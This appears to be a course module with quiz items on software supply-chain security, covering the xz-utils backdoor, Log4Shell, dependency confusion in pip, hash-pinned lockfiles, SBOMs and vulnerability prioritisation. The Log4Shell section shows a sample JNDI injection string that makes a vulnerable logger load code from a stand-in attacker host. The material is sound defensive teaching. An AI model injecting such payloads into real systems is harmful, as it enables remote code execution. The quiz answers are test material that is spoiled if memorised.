xz-utils is a compression library used by many Linux distributions. Its maintainer, Lasse Collin, ran it as an unpaid hobby project.

From late 2021 a contributor calling themselves **"Jia Tan"** sent helpful, ordinary patches. In 2022 several accounts, described in the linked historical reconstruction as suspected sock puppets, pressured Collin on the mailing list, complaining the project was slow and that he should hand over maintenance. Jia Tan gained commit access in late 2022 and was making releases by 2023.

In February and March 2024 Jia Tan released versions **5.6.0 and 5.6.1** containing a backdoor (**CVE-2024-3094**, CVSS 10.0, the maximum on CVSS's 0.0–10.0 severity scale). It was hidden with real care:

- The payload sat in two binary "test" files (`bad-3-corrupt_lzma2.xz`, `good-large_compressed.lzma`), whose encoded contents require additional inspection.
- The trigger was a modified `build-to-host.m4` that appeared **only in the release tarballs**, never in git.
- It activated only when building Debian or RPM packages on x86-64 Linux.
- Several distributions apply distribution-specific code patches to OpenSSH's `sshd` that links it to `libsystemd`, which links `liblzma`. The backdoor used that path to hook the server's RSA key verification, so the holder of the attacker's private key could run commands on any affected machine via SSH.

It was disclosed after a developer investigated unexpected behavior. Andres Freund, a PostgreSQL developer at Microsoft, noticed SSH logins on Debian unstable using unusual CPU (a failed login went from about 0.3 s to 0.8 s) and Valgrind errors, investigated, and disclosed it on 29 March 2024. The backdoored versions had reached Fedora Rawhide, Fedora 40 beta and Debian unstable and testing, primarily in prerelease distributions at disclosure; exact affected distributions and build conditions must be checked against their advisories.

Lessons:

- **The release artefact must match the source.** For the disclosed release-only trigger, building from the corresponding git source bypassed that trigger; this is not a general guarantee that git contents are safe.
- **Maintainer burnout is a security problem.** Critical infrastructure maintained by one tired volunteer is a soft target for social engineering.
- **Binary blobs need different review techniques.** Their purpose, generation process and decoded contents can be examined; they are not inherently unreviewable.

## Key takeaways
- The disclosed trigger was shipped in release tarballs rather than the git source.
- The SSH compromise depended on specific distribution linking and build conditions.
- Investigating unexpected latency and tool errors exposed the backdoor.
- Review release inputs and maintainer handovers, including how binary fixtures are generated.

## Further reading
- [Andres Freund disclosure](https://www.openwall.com/lists/oss-security/2024/03/29/4)
- [XZ project backdoor information](https://tukaani.org/xz-backdoor/)
- [Historical mailing-list timeline](https://research.swtch.com/xz-timeline)

questions.prompt: On a test machine running a prerelease distribution, a developer notices that failed SSH logins now take about 0.8 s instead of about 0.3 s, `sshd` uses unexpected CPU, and Valgrind reports errors inside `liblzma`. Nothing in the OpenSSH package changed recently, but the xz package did. What is the most useful interpretation?

options.text: Half a second is ordinary timing noise, so the observation can be ignored
options.explanation: The slowdown was consistent and came with CPU use and Valgrind errors, which noise does not explain. Dismissing it is exactly the reaction a stealthy backdoor relies on.

options.text: Treat it as an unexplained change after a dependency update: trace where the time goes, compare the new library release with the previous one, and report what you find
options.explanation: Correct. This is how Andres Freund approached the xz-utils anomaly in March 2024: he profiled the slowdown and Valgrind errors, traced them into the updated liblzma, found the backdoor and disclosed it on 29 March 2024. An unexplained behaviour change after an update is a lead worth following.

options.text: It must be a memory-safety bug in OpenSSH, so the fix is to patch OpenSSH
options.explanation: The OpenSSH package had not changed; the errors pointed into liblzma. In the real incident the route into sshd was distribution-specific library linking to a deliberately modified liblzma, not an OpenSSH flaw.

options.text: A static scan of the xz git repository will settle it, because any malicious code must be in git
options.explanation: The disclosed trigger, a modified build-to-host.m4, was only in the release tarballs, and the payload was hidden in binary test files. A clean-looking repository scan would not settle the question; the built release is what changed.

questions.workedExample:
1. Note what changed: the xz package was updated; OpenSSH was not.
2. Note the symptoms: slower failed logins, extra CPU in sshd and Valgrind errors inside liblzma. Together they point at the updated library, reached by sshd through distribution-specific linking (sshd → libsystemd → liblzma).
3. Reason about the next step: profile where the time goes and compare the new release with the previous one, including what the release archive builds, not only the git source.
4. In 2024 this route exposed CVE-2024-3094: Freund reported a slowdown from about 0.3 s to about 0.8 s in his setup. These timings are from his test, not universal figures; the lesson is that unexplained behaviour after an update deserves investigation.

questions.prompt: Which features made the xz-utils backdoor hard to spot? Select all that apply.

options.text: The payload was stored in binary test files that reviewers would not read
options.explanation: Correct. `bad-3-corrupt_lzma2.xz` and `good-large_compressed.lzma` looked like normal corrupt/valid test inputs for a compression library.

options.text: The trigger (`build-to-host.m4`) existed only in the release tarballs, not in the git repository
options.explanation: Correct for the disclosed trigger: the modified build-to-host.m4 was in the release tarballs and absent from git. Binary payload fixtures were present in git, so repository review still had relevant evidence to inspect.

options.text: It activated only in specific conditions, such as building a deb or rpm package on x86-64 Linux
options.explanation: Correct. The activation logic targeted particular platform, packaging and environment conditions; simply having an affected version number did not imply identical exploitability on every build.

options.text: It was introduced by a stranger's one-off pull request on the day of the release
options.explanation: Incorrect. It was introduced by 'Jia Tan', who had built trust over about two years with genuine patches and was a co-maintainer with release rights.

options.text: It exploited a memory-safety bug in OpenSSH
options.explanation: Incorrect for this incident: the disclosed route was a deliberately modified liblzma reached through distribution library links, not exploitation of an OpenSSH memory-safety flaw. This makes no claim that OpenSSH has no other bugs.

questions.workedExample:
1. Hiding the code: binary 'test' blobs (A).
2. Hiding the trigger: tarball-only build script (B).
3. Limiting exposure to analysis: narrow activation conditions, plus checks for debuggers and environment variables (C).
4. The *social* layer: a trusted maintainer, not a drive-by contributor (so D is false).
5. The path into sshd was a chain of linked libraries, not an OpenSSH vulnerability (so E is false).

lessons.title: Log4Shell and package selection
lessons.summary: Separate a vulnerable dependency from a malicious package and understand index confusion.
lessons.body:
Supply-chain risk includes both deliberate upstream tampering and ordinary bugs in trusted dependencies. Log4Shell illustrates the inventory problem; package-ecosystem attacks illustrate how names, credentials and version selection can direct a build to attacker-controlled code.

## Log4Shell: the vulnerable dependency (2021)

Not every supply-chain incident involves an attacker in the chain. **Log4Shell** (CVE-2021-44228, December 2021, CVSS 10.0) was a vulnerability in Log4j Core, a widely used Java logging component; it was not itself evidence of a malicious upstream implant.

Log4j supported *lookups*: `${...}` expressions inside log messages that were expanded at log time. One lookup was JNDI, which can fetch and load a Java object from a remote LDAP server. In vulnerable lookup paths and runtime configurations, attacker-controlled logged input could trigger a remote lookup, for example:

```
${jndi:ldap://evil.example/a}
```

The vulnerable path could contact an attacker LDAP endpoint and enable code execution, depending on runtime and reachable exploitation paths. The original advisory affected Log4j Core 2.0-beta9 through 2.14.1; `log4j-api` alone and Log4j 1.x are different cases.

A major defensive challenge was the question **"where do we run Log4j?"** It could be a **transitive dependency**, pulled in by a framework, inside a fat JAR, inside a vendor appliance. Fixes also came in waves: 2.15.0, then 2.16.0 and 2.17.0 for follow-up CVEs, then 2.17.1, so teams had to find everything more than once.

## Attacks on the package ecosystem

Beyond the three incidents introduced so far, recognise these patterns:

- **Typosquatting**: publishing `reqeusts` or `python-dateutils` and waiting for typos. Removal counts vary; the risk is selecting an attacker-controlled lookalike name.
- **Account takeover**: stealing a maintainer's registry credentials and publishing a malicious version of a real package (the npm package `ua-parser-js` in 2021 shipped a cryptominer this way).
- **Handover**: offering to maintain an abandoned package. In 2018 the npm `event-stream` package was handed to a new maintainer who added a dependency that targeted one Bitcoin wallet app.
- **Dependency confusion**: in his February 2021 account, Alex Birsan reported successful tests at more than 35 organisations, including Apple, Microsoft and PayPal. His research used exposed internal package names and public packages with matching names; a higher public version was one demonstrated selection route, especially with pip. Some installations occurred on developer machines as well as build servers.

> [!warning] Why dependency confusion works with pip
> With `pip install --extra-index-url https://pypi.internal ...`, pip gives indexes no priority and selects the best compatible candidate under its version constraints and resolver rules. If `acme-auth` is 1.4 internally and an attacker publishes `acme-auth` 99.0 on PyPI, pip can choose 99.0 when both candidates are compatible and no other constraints or installed-state decisions change selection. Use a single `--index-url` pointing at a proxy that serves your internal names exclusively, and pin hashes.

> [!analogy] Real-world analogy: ordering by part name from two suppliers
> A workshop's ordering system asks both its in-house stores and a public catalogue for a part by name, say "AUTH-KIT", then automatically buys whichever offer has the newest model number. A stranger lists a part with the same name in the public catalogue and gives it model number 99.
>
> **How it maps:** The in-house stores are the internal index, the public catalogue is PyPI, the part name is the package name, and "newest model number" is pip choosing the highest compatible version across all configured indexes.
>
> **Where it stops:** A clerk might notice an odd supplier; pip applies its rules without suspicion, and a source package can run its build code during installation. The fix is also simpler than vetting suppliers: give the build only one index, which serves your internal names from the internal source.

## Key takeaways
- Log4Shell was a vulnerability in affected Log4j Core configurations, rather than proof of a malicious implant.
- Typosquatting, account takeover and maintainer handover attack different parts of package trust.
- pip does not prioritise the internal index merely because it was configured alongside a public one.
- Use namespace and index policies that keep internal names under your control.

## Further reading
- [Apache Log4j advisories](https://logging.apache.org/log4j/2.x/security.html)
- [pip package selection and index warning](https://pip.pypa.io/en/stable/cli/pip_install/)
- [event-stream incident analysis by npm](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)
- [ua-parser-js maintainer incident report](https://github.com/faisalman/ua-parser-js/issues/536)
- [Birsan’s original dependency-confusion account](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

questions.prompt: In a clean CI environment, both package candidates below are compatible, no other constraints apply, and the public index remains enabled. pip uses --extra-index-url for an internal acme-billing 2.3 while public PyPI offers 99.0.0. Which candidate does this illustrate selecting?

options.text: pip installs 2.3, because extra indexes take priority over PyPI
options.explanation: pip has no index priority. `--extra-index-url` adds another source of equal standing; it does not override PyPI.

options.text: pip fails with a conflict error because two indexes have the same package
options.explanation: pip does not treat this as a conflict. It merges candidates from all indexes.

options.text: pip installs 99.0.0 from PyPI, because it picks the highest version across all indexes
options.explanation: Correct under the stated compatibility/constraint assumptions. A malicious source distribution may execute build code during installation; a wheel need not execute package code until import/use. Exposure is limited by the job's actual privileges and secrets.

options.text: pip installs whichever index responds first
options.explanation: Resolution is by version, not by which index answers first. The highest version wins.

questions.workedExample:
1. pip collects candidate files for `acme-billing` from PyPI and from the extra index.
2. Candidates: 2.3 (internal) and 99.0.0 (public).
3. With no version constraint and no index priority, the resolver picks the highest compatible version wherever it came from: 99.0.0 beats 2.3, so the attacker's public package wins.
4. Fixes:
   - Use a single `--index-url` pointing at a proxy that serves internal names only from the internal source.
   - Pin versions with `--require-hashes`, so an unexpected file is rejected.
   - Register placeholder names on the public registry.

lessons.title: Lockfiles and artifact hashes
lessons.summary: Understand what an enforced package hash checks and what it cannot prove.
lessons.body:
Version selection and byte identity are different checks. A lockfile records intended dependency choices; an enforced artifact hash checks whether the downloaded bytes are one of the approved files. Neither establishes that the approved package is harmless.

## Lockfiles and artifact hashes

A **lockfile** (`poetry.lock`, `package-lock.json`, `requirements.txt` from `pip-compile`) records resolved dependency choices; complete reproducibility also depends on platform markers, artifacts, installer behavior and how the lockfile is enforced. With **hashes**, the installer also refuses an artefact whose content differs from what you reviewed:

```
# Schematic only: digest is truncated.
# A real requirements file needs all digits.
requests==2.32.3 \
  --hash=sha256:70761c...
```

```
pip install --require-hashes \
  -r requirements.txt
```

For each downloaded distribution, pip requires a match with an allowed digest for that requirement; several allowed hashes can cover different platform files. A cryptographic hash such as SHA-256 maps a file of any size to a fixed-length fingerprint (256 bits, written as 64 hexadecimal characters). pip installs a file only when the fingerprint of what it downloaded equals one you recorded.

For example, if someone replaces `requests-2.32.3` on a mirror with a modified copy, its SHA-256 digest will, in practice, differ from the recorded full digest (shown here only as `70761c...`), and pip refuses it. Collisions are mathematically possible, so a match is strong computational evidence of approved bytes rather than a proof.

The check has a sharp limit: it compares bytes, not intentions. If the file you recorded was already malicious, its digest matches perfectly and pip installs it. Hash checking also says nothing about vulnerabilities discovered later in the approved file.

> [!analogy] Real-world analogy: photographing your bike before a repair
> Before leaving your bike at a repair shop, you photograph it. When you collect it, you compare the bike with the photo: if the shop hands you a different bike, you notice at once.
>
> **How it maps:** The photo is the recorded digest in `requirements.txt`; collecting the bike is pip downloading a file; refusing a bike that does not match the photo is hash-checking mode rejecting an unapproved file.
>
> **Where it stops:** If the frame was already bent when you took the photo, the bent bike matches perfectly: a hash approves exact bytes, not their safety. And a photo can miss a small change, whereas changing even one byte of a file changes its SHA-256 digest in practice.

## Key takeaways
- Exact versions and artifact hashes make updates deliberate.
- Hash checking tests approved bytes, rather than the safety of those bytes.
- Platform markers, artifacts and installer behaviour still affect reproducibility.

## Further reading
- [pip secure installs](https://pip.pypa.io/en/stable/topics/secure-installs/)
- [NIST Secure Hash Standard](https://csrc.nist.gov/pubs/fips/180-4/upd1/final)

questions.prompt: What does `pip install --require-hashes -r requirements.txt` protect against?

options.text: Every listed package being free of known vulnerabilities
options.explanation: Hashes say nothing about vulnerabilities. A pinned, hash-matched package can still have a CVE; that is SCA's job.

options.text: Rejecting downloaded distributions that do not match an approved digest, such as an unexpected replacement file
options.explanation: Correct. pip compares each downloaded distribution with the allowed hashes for that requirement. Several hashes can approve platform variants; a matching finite digest is strong evidence rather than a proof of byte equality or content safety. Source-build dependencies need separate controls.

options.text: A malicious maintainer publishing a backdoor in the exact version you pinned
options.explanation: If the backdoored file was the one you hashed (as with xz 5.6.1 for anyone who pinned it), the hash matches. Hashes freeze content; they don't judge it.

options.text: Typosquatting, by checking that package names are spelled correctly
options.explanation: If you typed the typosquatted name into the file and hashed its file, pip would happily install it. Hashes don't check spelling.

questions.workedExample: Hash-checking mode requires explicitly covered dependencies and accepted artifact hashes. Unexpected downloaded content is rejected, while a malicious artifact whose hash was approved still passes. Source-build dependencies and build execution require their own controls; prefer reviewed wheels or separately controlled builds when relevant.

lessons.title: Release inventories and vulnerability priorities
lessons.summary: Use a component inventory to find candidate deployments, then rank advisories with severity, exploitation evidence and your own exposure.
lessons.body:
When a dependency advisory appears, responders first need to locate the software that may include the component. A per-release inventory narrows that search, provided its generation scope and metadata are reliable. Then they need an order of work, because a real scan usually reports far more advisories than a team can fix at once. The small example below reports candidates; it deliberately does not implement a vulnerability resolver.

## Component inventory

A **software bill of materials (SBOM)** is a machine-readable component inventory whose completeness depends on generation scope and metadata quality, in **SPDX** or **CycloneDX** format. US Executive Order 14028 (May 2021) pushed SBOMs into federal procurement. With SBOMs stored per release, "where do we run Log4j?" becomes a query:

```python
import json

def check(path):
    with open(path) as f:
        sbom = json.load(f)
    # No component list gives no candidates.
    for c in sbom.get("components", []):
        # Name alone cannot establish a CVE.
        if c.get("name") != "log4j-core":
            continue
        # Candidates, not CVE verdicts.
        ver = c.get("version", "unknown")
        print(path, ver)
```

This simplified CycloneDX-style inventory lists candidate components, not vulnerability verdicts. Match full package identity and version against the applicable advisory, including backport branches and prereleases; then assess configuration/reachability. A blanket `<2.17.1` check would misclassify backported fixes and later advisories.

> [!analogy] Real-world analogy: a food recall and the ingredients list
> A supplier recalls one batch of peanuts. A manufacturer that keeps an ingredients record for every product batch can list which products might contain them within minutes; one without records has to test its whole warehouse.
>
> **How it maps:** The ingredients record is the per-release SBOM, the recalled batch is the advisory's affected package and version range, and listing possible products is the candidate query above.
>
> **Where it stops:** A recall notice names exact batches, and an ingredients list is usually complete. Software advisories have backports and conditions, and an SBOM is only as complete as the tool that generated it, so a match is a candidate to check, not a verdict.

> [!note] Content gap
> Universal timings for answering inventory questions and relative incident-frequency claims are omitted because no comparable measurement dataset was available.

## From candidates to a priority order

A scanner might report hundreds of advisories across your releases. Three public signals answer different questions, and none of them knows your systems:

| Signal | Question it answers | Watch out for |
|---|---|---|
| CVSS v4.0 Base (CVSS-B) | How severe is the flaw technically? | Severity, not your risk |
| EPSS | How likely is exploitation activity soon? | A population estimate |
| CISA KEV | Has it been exploited in the wild? | Absence is not safety |

- **CVSS** (Common Vulnerability Scoring System, maintained by FIRST) rates a flaw from 0.0 to 10.0. Vendors and the NVD usually publish only the Base score, which v4.0 labels **CVSS-B**; the specification says it measures severity and should not be used alone to assess risk. Consumers can add **Threat metrics** (exploit maturity: attacked, proof-of-concept available or unreported) and **Environmental metrics** (how the flaw matters in their own system), labelled CVSS-BT, CVSS-BE or CVSS-BTE.
- **EPSS** (Exploit Prediction Scoring System, also from FIRST) publishes, every day, a probability from 0 to 1 that exploitation activity for a CVE will be observed in the next 30 days, plus a percentile against all scored CVEs. Most CVEs score close to zero. FIRST advises against multiplying EPSS by CVSS: a probability times a severity rank has no clear meaning.
- **KEV** (CISA's Known Exploited Vulnerabilities catalog) lists CVEs with reliable evidence of exploitation in the wild and a clear remediation, such as a vendor update. CISA urges every organisation to prioritise these. US federal civilian agencies must fix them within set deadlines; since June 2026 that duty sits in Binding Operational Directive (BOD) 26-04, which replaced BOD 22-01 and also weighs asset exposure, exploit automation and technical impact.

Then add what only you know: is the vulnerable component actually deployed, reachable from the internet, running with high privilege or near sensitive data? A sensible, illustrative order is:

1. Known-exploited (KEV-listed or seen in your own logs) on reachable systems: patch or mitigate now.
2. High EPSS or exploit code available, with high severity, on exposed systems: next.
3. The rest by severity and exposure, in the normal patch cycle, with re-checks as EPSS and KEV change.

Every rule like this makes mistakes in both directions. A CVE missing from KEV may simply not have been reported yet, and an EPSS score can change overnight when exploit code appears.

## Key takeaways
- An SBOM records components and their metadata for a particular release.
- A component-name match is a candidate, not proof of an affected version or reachable exploit.
- Advisory ranges, package identity, backports and runtime configuration still matter.
- CVSS-B measures severity, EPSS estimates near-term exploitation likelihood and KEV records exploitation already seen.
- Rank work with those signals plus your own exposure; known exploitation on reachable systems comes first.

## Further reading
- [CISA SBOM](https://www.cisa.gov/sbom)
- [CycloneDX specification](https://cyclonedx.org/specification/overview/)
- [Apache Log4j advisories](https://logging.apache.org/log4j/2.x/security.html)
- [CVSS v4.0 specification](https://www.first.org/cvss/v4-0/specification-document)
- [Using EPSS (FIRST)](https://www.first.org/epss/using-epss)
- [CISA KEV catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

questions.prompt:
Your SBOM query and scanner confirm three affected components this morning (all details hypothetical):

- **A**: CVSS-B 9.8 in a PDF library used only by an internal batch job with no network input; not in CISA KEV; EPSS 0.002.
- **B**: CVSS-B 7.5 in your internet-facing VPN appliance; added to CISA KEV last week.
- **C**: CVSS-B 8.1 in a public web framework your customer portal uses; not in KEV; EPSS 0.6, and exploit code was published yesterday.

You can safely change one system today. Which order is most defensible?

options.text: A, C, B: highest CVSS score first
options.explanation: CVSS-B measures technical severity, not your risk. A's 9.8 sits in a job with no network input and almost no predicted exploitation, while B is already being exploited in the wild on an exposed system.

options.text: B, C, A: known exploitation on an exposed system first, then a high exploitation likelihood on an exposed system, then the unreachable one
options.explanation: Correct. KEV records reliable evidence of exploitation in the wild, and B is internet-facing, so it comes first. C is exposed with a high EPSS and public exploit code, so it is next. A is severe on paper but hard to reach and unlikely to be exploited soon; schedule it in the normal cycle.

options.text: C, B, A: highest EPSS first, because a probability is more precise than a catalogue entry
options.explanation: EPSS estimates future exploitation activity across the population; a KEV listing says exploitation has already happened. Recent confirmed exploitation of an exposed system outranks a forecast. FIRST's own guidance treats a KEV listing as grounds for high priority regardless of EPSS.

options.text: Multiply each CVSS score by its EPSS probability and fix the largest product first
options.explanation: FIRST advises against this: CVSS is an ordinal severity rating and EPSS a calibrated probability, so their product has no clear meaning. It would also ignore B's KEV listing and your exposure context.

questions.workedExample:
1. Ask the three public questions separately. Severity: CVSS-B ranks A > C > B. Likelihood: EPSS is high for C and tiny for A. Evidence: only B is in CISA KEV, so exploitation has already been seen.
2. Add what only you know. B and C are internet-facing; A takes no network input.
3. Known exploitation on an exposed system wins: B first (patch, or mitigate if the patch cannot go out today).
4. C is exposed, likely to be exploited soon and has public exploit code: next.
5. A stays in the normal patch cycle. Re-check it if its exposure changes or it appears in KEV.
6. Do not combine the scores by multiplication; treat each signal as an answer to a different question.
